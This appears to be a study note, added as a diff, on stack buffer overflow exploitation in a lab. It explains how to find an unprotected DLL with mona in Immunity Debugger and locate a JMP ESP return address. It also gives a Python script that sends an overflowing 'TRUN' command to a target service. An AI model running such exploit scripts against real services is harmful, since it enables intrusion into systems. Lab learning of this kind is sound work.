@@ -1,0 +1,47 @@
+##################################
+#####BUFFER###############
+#############OVER-FLOW#####################
+######Finding The Right Module#################
+
+1)In Immunity we will loocking from a dll without protection for that:
+    ->GitHub: corelan/mona
+    ->Download mona.py and copie it in the Immunity_Debugger/PyCommands folder
+    ->In Immunity tap: !mona modules
+    ->check for FALSE boolean for the dllss
+
+2)Convert assembly language into HEX:
+    ->Kali# locate nasm_shell
+    #Use the JUMP cmd as a Pointer on the Buffer
+    ->nasm_shell> JMP ESP 
+    ->Get the HEX Result Value displayed for ex: FFE4
+
+3)In Immunity tap:
+    !mona find -s "/XFF\xe4" -m dllName.dll
+    ->get the RETURN ADDRESS in Result
+
+4)In scrypt modify:
+#!/usr/bin/python
+import sys
+import socket
+
+#the Value of the HEXA RETURN ADDRESS above will be REVERSED
+shellcode = "A" * 2003 + "\xaf\x11\x50\x62"
+
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port)) #CouldBe HARDCODED...
+    s.send(('TRUN /.:/' + shellcode))
+    s.close()
+    
+except Exception as e:
+    print(e)
+    print ("Error connecting to server")
+    sys.exit()
+
+5)In Immunity:
+    click on the BLUE ARROW (Enter expression to follow)
+    Enter the RETURN ADDRESS in HEX value
+    click on F2
+    click on 'play'
+6)Go back to Kali and execute the script above
